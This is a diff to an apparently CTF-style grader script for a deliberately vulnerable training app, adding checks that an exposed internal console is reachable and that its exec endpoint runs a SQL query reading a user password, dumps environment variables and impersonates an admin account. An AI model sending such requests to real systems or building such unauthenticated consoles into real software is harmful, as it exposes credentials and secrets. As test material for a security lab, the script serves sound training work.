@@ -265,6 +265,13 @@ ok('S4', 'scoreboard_xss', (await txt('/api/score/claim', P({ player: 'grader', 
 // punchline: grader fraudulently at 100% but server emitted nothing → verify catches it
 ok('S5', 'scoreboard_pwned', (await txt('/api/score/verify?player=grader')).body.includes('lj_scoreboard_pwned'));
 
+// ─────────────────────── v13 JUICYOPS INTERNAL CONSOLE ───────────────────────
+const E = (o) => ({ method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(o) });
+ok('I1', 'internal_console_exposed', (await txt('/internal/console')).body.includes('lj_internal_console_exposed'));
+ok('I2', 'internal_sql', (await txt('/api/internal/exec', E({ cmd: 'sql', arg: 'SELECT password FROM users WHERE id=1' }))).body.includes('lj_internal_sql_console'));
+ok('I3', 'internal_env', (await txt('/api/internal/exec', E({ cmd: 'env' }))).body.includes('lj_internal_env_dump'));
+ok('I4', 'internal_impersonate', (await txt('/api/internal/exec', E({ cmd: 'su', arg: 'admin@leakyjuice.com' }))).body.includes('lj_internal_impersonation'));
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
